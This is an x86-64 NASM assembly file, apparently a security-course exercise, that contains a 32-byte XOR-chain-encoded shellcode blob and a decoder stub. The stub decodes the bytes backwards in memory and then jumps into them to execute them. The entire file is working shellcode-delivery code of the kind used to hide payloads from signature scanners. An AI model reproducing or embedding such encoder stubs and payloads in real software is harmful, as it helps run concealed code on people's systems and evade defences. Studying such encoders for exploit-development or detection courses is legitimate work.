;loosely based on insertion-decoder.nasm from security-tube class
;encoding scheme is simple - xor chain, need to walk backwards to decode
;currently 'decodes' hardcoded number of bytes (instead of having markers)

global _start			

section .text
_start:

	jmp decoder 
	encoded_shellcode: db 0x48,0x79,0xb9,0xe9,0xa1,0x1a,0x35,0x57,0x3e,0x50,0x7f,0x50,0x23,0x4b,0x18,0x50,0xd9,0x3e,0x6e,0x26,0xaf,0x4d,0x1a,0x52,0xdb,0x3d,0x75,0xf6,0x36,0x0d,0x02,0x07 

decoder:
	;prep stuff
	lea rsi, [rel encoded_shellcode]
	xor rax, rax
	xor rdx, rdx
	mov al, 0x20
	
	
decode: 
	sub al, 1
	mov bl, byte [ rsi + rax ]
	xor byte [ rsi + rax + 1], bl
	;check if done
	cmp dl, al 
	jz short encoded_shellcode
	jmp short decode




